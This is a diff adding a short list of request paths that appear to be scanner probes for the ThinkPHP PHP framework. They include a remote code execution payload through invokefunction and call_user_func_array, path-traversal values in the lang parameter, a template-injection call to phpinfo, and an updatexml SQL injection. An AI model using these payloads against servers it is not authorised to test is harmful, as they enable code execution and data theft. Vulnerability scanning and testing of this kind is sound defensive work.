@@ -1,0 +1,10 @@
+?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+/?lang=../../thinkphp/base
+/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug
+/index.php?s=/index/index/name/$%7B@phpinfo()%7D
+/?s=index/index/index
+/index.php?s=captcha
+/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
+/index.php?s=example
+
+/?s={{randstr}}&c={{randstr}}&a={{randstr}}&m={{randstr}}
